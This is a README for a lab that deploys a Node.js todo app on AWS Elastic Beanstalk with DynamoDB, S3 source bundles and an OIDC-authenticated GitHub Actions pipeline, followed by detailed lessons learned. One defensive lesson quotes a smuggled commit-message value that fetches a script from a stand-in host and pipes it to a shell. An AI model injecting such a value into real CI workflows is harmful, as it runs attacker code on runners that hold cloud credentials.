# Lab 04 (sub-lab) — Elastic Beanstalk continuous delivery

A Node.js todo application on a managed Elastic Beanstalk environment, persisting to DynamoDB. Source bundles are versioned in S3 and deployed by GitHub Actions through a short-lived OIDC role — no servers, no load balancer config, and no long-lived AWS keys anywhere.

The rest of lab 04 builds a web tier by hand: launch template, ASG, ALB, scaling policy, ~30 resources. This sub-lab hands that same job to Elastic Beanstalk and spends the effort on the delivery pipeline instead. Same outcome, opposite division of labour.

## The task

- Node.js app on Elastic Beanstalk, publicly reachable, managed entirely by EB
- **Initial** deployment from a source bundle in S3 — via Elastic Beanstalk, not from GitHub
- GitHub Actions packages a ZIP, uploads to S3, registers a new application version, deploys it
- Versioned releases, so multiple versions can be tracked and rolled between
- Optional challenge: connect to an external data service through EB-managed environment variables

## Two push-to-deploy paths, one repo

This is the part worth understanding before reading anything else. A push to `main` can trigger **two different deploy mechanisms**, and which one fires depends entirely on *which files changed*:

```
                          push to main
                               │
              ┌────────────────┴────────────────┐
   app/** changed                    practice.yml / deployment.yaml changed
              │                                 │
      GitHub Actions                  CloudFormation GitSync
              │                                 │
   npm ci && npm test                  create/update the stack
   zip the source bundle                        │
   s3://lab04-eb-bundles-…/bundles/     bucket, table, IAM roles,
   create-application-version           EB application + environment
   update-environment                           │
              └────────────────┬────────────────┘
                               ▼
              Elastic Beanstalk  ·  lab04-todo-env
              managed EC2, nginx → node on :8080
                               │
                               ▼
                DynamoDB  ·  lab04-todo-items
                (TODO_TABLE_NAME env var)
```

**Infrastructure is GitSync's job. Application code is Actions' job.** The workflow's `paths:` filter is what keeps them apart — it only matches `lab-04/todo-app-bean-stalk/app/**`, so editing the template never triggers a deploy and editing the app never touches the stack.

## Architecture

| Piece | Resource | Note |
|---|---|---|
| Bundle store | `lab04-eb-bundles-<account>-<region>` | versioning on, public access blocked, TLS-only, old versions expire at 30 days |
| Data service | `lab04-todo-items` (DynamoDB, on-demand) | name reaches the app as `TODO_TABLE_NAME` |
| Compute | EB environment `lab04-todo-env` | single instance by default, `t3.micro`, enhanced health |
| App identity | `lab04-eb-instance-role` | web tier + SSM + scoped DynamoDB + scoped bundle read |
| EB identity | `lab04-eb-service-role` | enhanced health + managed platform updates |
| CI identity | `lab04-eb-github-actions-role` | assumed via OIDC, no stored credentials |

The app itself keeps its data store behind an interface (`store/dynamo.js`, `store/memory.js`) chosen at startup by whether `TODO_TABLE_NAME` is set. That's what lets `npm test` run in CI with no AWS account and no table, while production gets the real thing.

## Setup runbook

The stack can't be created in one pass, and that's structural rather than sloppy: the environment needs a bundle that lives in a bucket the same stack creates. `InitialBundleKey` gates it.

**1 — First pass.** Push with `deployment.yaml` as committed (`InitialBundleKey: ''`). Creates the bucket, table, roles, OIDC provider and the EB *application*. No environment yet.

**2 — Confirm the platform string.** From the stack's `ListSolutionStacksCommand` output:
```
aws elasticbeanstalk list-available-solution-stacks --region <region> \
  --query "SolutionStacks[?contains(@, 'Node.js')]" --output text
```
AWS bumps the minor version regularly. If `SolutionStackName` is stale, environment creation fails outright — see *what broke*.

**3 — Seed the initial bundle.** From the `UploadInitialBundleCommand` output:
```
cd lab-04/todo-app-bean-stalk/app
zip -r /tmp/v1-initial.zip . -x "node_modules/*"
aws s3 cp /tmp/v1-initial.zip s3://lab04-eb-bundles-<account>-<region>/bundles/v1-initial.zip
```
This is the deliberately manual step. **The requirement is that the first deployment comes from a bundle in S3, deployed by Elastic Beanstalk — not from GitHub.** Doing it by hand is the point.

**4 — Second pass.** Set the key in `deployment.yaml` and push:
```yaml
parameters:
  InitialBundleKey: bundles/v1-initial.zip
```
The environment comes up on that bundle. `EnvironmentUrl` in the outputs is the public endpoint — for a single-instance environment that's the instance address, not the `*.elasticbeanstalk.com` name; use `DescribeCnameCommand` for the URL you actually hand in.

**4b — Hand the version over to CI.** Once the environment exists, add:
```yaml
  ManageVersionLabel: 'false'
```
Without this, CloudFormation keeps asserting which version is deployed and reverts every CI release on the next sync — and GitSync syncs on *every* push, not only template changes. See *what broke*.

**5 — Wire up GitHub.** Repo → Settings → Secrets and variables → Actions:

| Name | Kind | Source |
|---|---|---|
| `AWS_ROLE_ARN` | secret | `GitHubActionsRoleArn` output |
| `AWS_BUNDLE_BUCKET` | secret | `BundleBucketName` output |
| `AWS_REGION` | variable | the lab region — **the workflow falls back to `eu-north-1`** |

Both account-identifying values are secrets rather than variables so the account ID stays out of a public repo's logs.

**6 — Hand over to CI.** Edit anything under `app/` and push. From here every deploy is automatic.

## Demo runbook

**1. The app is up.** Open `EnvironmentUrl`. The header card shows the version label, commit, build time and the live DynamoDB table name — all read from the running instance, not baked into the HTML.

**2. It responds correctly.** Add a todo, tick it, delete it. Or:
```
curl -s http://<env-url>/health
curl -s -X POST http://<env-url>/api/todos -H 'content-type: application/json' -d '{"title":"live review"}'
```

**3. External service connectivity.** `curl -s http://<env-url>/api/health/store` returns the table it is actually talking to — it performs a real DynamoDB call, so a green answer proves connectivity rather than configuration. Then show the item in the DynamoDB console. The table name is never in the code: it arrives as an EB environment variable, visible under Configuration → Updates, monitoring, and logging → Environment properties.

**4. Redeploy from a push.** Change something visible in `app/public/index.html`, commit, push. Watch the Actions run, then Elastic Beanstalk → Application versions — a new label appears and the environment moves onto it.

**5. Version updates correctly.** Refresh the page: the version label changes to `v<run>-<attempt>-<sha>`. The workflow proves this itself before going green — it polls `/api/version` and fails if the endpoint doesn't report the exact label it just built.

**6. Roll between versions.** Application versions → select an earlier one → Deploy. That's the rollback story, and the reason the bucket has versioning enabled.

## Where each requirement is met

| Requirement | Where |
|---|---|
| Public EB endpoint, EB-managed | `Environment`, `EnvironmentType: SingleInstance`, no EC2 resources in the template |
| Initial deploy from an S3 bundle via EB | `InitialApplicationVersion` + the manual step 3 |
| Automated deployment, no manual uploads | `.github/workflows/deploy-beanstalk.yml` |
| Versioned releases | version label per run, versioned bucket, `MaxCountRule` keeping 20 |
| External data service via EB env vars | DynamoDB, `TODO_TABLE_NAME` option setting |
| Safe release + fast validation | test job gates deploy; post-deploy version assertion; redeploy any prior version |
| Workflow security | OIDC, no stored keys, scoped trust and permissions |

## Design decisions

- **Single instance, not load balanced.** An ALB is ~$16/month idle and adds nothing this lab demonstrates — EB is still managing the instance, health and deployments. `EnvironmentType: LoadBalanced` flips it, and the template already carries the conditional option settings (rolling deployments at 50% batches, ASG min/max) for that case.
- **Production dependencies ship inside the bundle.** 3.8 MB zipped, against a 512 MB limit. The alternative — letting the instance `npm install` at deploy time — makes every deployment depend on npm.org being reachable and healthy. Bundling makes the artifact self-contained and the deploy reproducible.
- **The CI role can't create infrastructure.** It has `s3:PutObject` on `bundles/*`, three Elastic Beanstalk mutations, and read-only describes. It cannot create an application, delete an environment, or touch the DynamoDB table. A compromised workflow can ship bad code; it cannot dismantle the lab.
- **OIDC trust is pinned to one branch.** `repo:leandreAlly/aws-lab:ref:refs/heads/main` as `StringEquals`, not `StringLike`. A wildcard subject like `repo:owner/*` would let any repo in the org — or a pull request from a fork — assume the role.
- **`/health` separate from `/`.** The health check hits a route that doesn't touch DynamoDB, so a table problem shows as a failing app, not a dead instance that EB replaces in a loop.
- **`npm test` gates the deploy.** Six tests against the in-memory store. Not because the app is complicated, but because "deployments occur without manual intervention" is only safe if something is checking.

## What broke / what to watch for

Written while building; the live-deployment findings get appended after the review.

- **`AWSElasticBeanstalkWebTier` does not grant access to your own bucket.** It allows `s3:Get*` on `arn:aws:s3:::elasticbeanstalk-*` only. The bundle bucket here is `lab04-eb-bundles-…`, which doesn't match that pattern, so every deployment would fail while the instance downloads its own bundle — presenting as a platform or health error, not an obvious permissions one. Fixed with an explicit `read-source-bundles` inline policy. **A managed policy that sounds right is not the same as one that covers your resource names.**
- **Elastic Beanstalk reserves the `Name` tag key.** Every other lab in this repo tags `Name` on every resource, so the environment inherited that convention and creation failed with *"Tag key 'Name' is reserved and can't be modified"*. EB sets `Name` itself, to the environment name. Anything prefixed `aws:` or `elasticbeanstalk:` is reserved too. A house convention that holds across four labs is still only a convention — the service gets the final say.
- **A deploy role needs to *mutate* the Auto Scaling group, not just read it.** Beanstalk suspends the ASG's processes before pushing code to instances — so a health check can't replace an instance mid-deploy — and makes that call with the caller's credentials. With only `autoscaling:Describe*` the deploy failed four seconds in with `Failed to deploy application`, the environment silently stayed on its previous version, and the workflow's version poll then waited ten minutes for something that was never going to happen. Nothing in the workflow log said why; the reason was in `aws elasticbeanstalk describe-events`, which is the log that actually matters when a deploy goes nowhere.
- **CloudFormation owning `VersionLabel` would have reverted every CI deploy.** Pre-empted rather than observed — deploys were failing for the reason above, so it never got the chance. The mechanism is real: GitSync re-syncs the stack on *every push to the repo*, not just template changes, and each sync reasserts `VersionLabel: !Ref InitialApplicationVersion`. A green pipeline plus a stack in perfect sync with its template would still have served the old code. `ManageVersionLabel` keeps the property for the first environment create — it must launch on the S3 bundle — and drops it with `AWS::NoValue` thereafter. Infrastructure and releases are only independent once the template stops naming a version.
- **I diagnosed this wrong first.** The symptom — environment stuck on the initial version — matched the `VersionLabel` trap I'd already documented, so I fixed that and was confident. The events log then showed deploys had been failing on a missing IAM action the whole time. A known failure mode that fits the symptom is not evidence that it *is* the failure; check the service's own log before acting on a theory that flatters your notes.
- **A `wait` that returns on the right status can still be waiting for the wrong thing.** `aws elasticbeanstalk wait environment-updated` returns once the environment is `Ready`, and `update-environment` is asynchronous — so it can poll before the status flips to `Updating` and return immediately. Worse, it would have reported success against the *reverted* version above. Replaced with a poll on `describe-environments` until Beanstalk reports the environment running the exact label this run built. That change is what surfaced the rollback at all: the generic waiter had been hiding it.
- **`SolutionStackName` is an exact string with a minor version in it.** I pinned `v6.6.3`; `eu-north-1` was actually serving `v6.11.5` — six minor versions out, and nothing warns you. Wrong string, no environment. Confirm with the `ListSolutionStacksCommand` output before step 4, every time.
- **A deploy role needs far more than `elasticbeanstalk:*`.** An EB environment *is* a CloudFormation stack that EB owns (`awseb-e-<id>-stack`), plus a bucket EB owns, so `update-environment` fails on `cloudformation:GetTemplate` and `s3:CreateBucket` long before anything Beanstalk-shaped goes wrong. The permission the API name implies is not the permission the API needs. Scoping still works — `cloudformation:*` on `stack/awseb-*/*` is what AWS's own `AdministratorAccess-AWSElasticBeanstalk` does — but you find the list by hitting each denial in turn, because no error names the next one.
- **`UpdateEnvironment` demands `s3:CreateBucket` on Beanstalk's own working bucket, even when it already exists.** EB keeps a per-region bucket (`elasticbeanstalk-<region>-<account>`) for logs and internal storage, and every `update-environment` call verifies the caller *could* create it. Running `aws elasticbeanstalk create-storage-location` first does not help — the check is on the permission, not the bucket. The CI role now carries `s3:*` pinned to that one bucket ARN, which is narrower than the `elasticbeanstalk-*` wildcard AWS's own managed policies use. A deploy role that only touches your own bucket is not sufficient; the service has a bucket of its own in the loop.
- **Naming a GitHub Environment rewrites the OIDC subject claim.** The deploy job carried `environment: production` as a place to hang an approval gate later. That one line changes the `sub` GitHub puts in the token from `repo:OWNER/REPO:ref:refs/heads/main` to `repo:OWNER/REPO:environment:production`, and the trust policy pins the first form with `StringEquals` — so AWS refused with `Not authorized to perform sts:AssumeRoleWithWebIdentity`. The role, the permissions and the provider were all correct; the token simply didn't say what the policy expected. Either drop the environment or pin the environment form in the trust policy — but the two have to agree, and nothing warns you they've diverged.
- **Untrusted input in a `run:` block is remote code execution.** My first draft interpolated `${{ github.event.head_commit.message }}` straight into shell to use as a version description. A commit message like `"; curl evil.sh | sh; #` runs on a runner that has *already assumed the AWS role*. It now travels via `env:` and is read as `$COMMIT_MESSAGE`. Expression interpolation happens before the shell ever sees the script — the value isn't a string being passed to bash, it *becomes* the script.
- **`wait environment-updated` returning does not mean the deploy worked.** It waits for status `Ready`, and `Ready` includes `Ready + degraded`. The workflow's own verify loop against `/api/version` is what turns a green check into a real signal.
- **Port 8080.** The EB Node platform proxies nginx to `:8080`. An app hardcoded to 3000 deploys "successfully" and serves 502s.
- **EB version labels must be unique per application.** Re-running a failed workflow with a label derived only from the run number collides and fails at `create-application-version`; `run_attempt` is in the label for exactly that reason.

## Cost and teardown

Cheapest lab here — one `t3.micro`, an on-demand DynamoDB table, and a few MB of S3. Nothing has a NAT gateway's idle bill.

Teardown is deleting the stack, with one snag: **CloudFormation can't delete a non-empty bucket.** Empty it first:
```
aws s3 rm s3://lab04-eb-bundles-<account>-<region> --recursive
```
Bucket versioning means `rm --recursive` leaves noncurrent versions behind; if the delete still fails, empty it from the console, which removes versions too.

## Screenshots

*(added after the live deployment)*
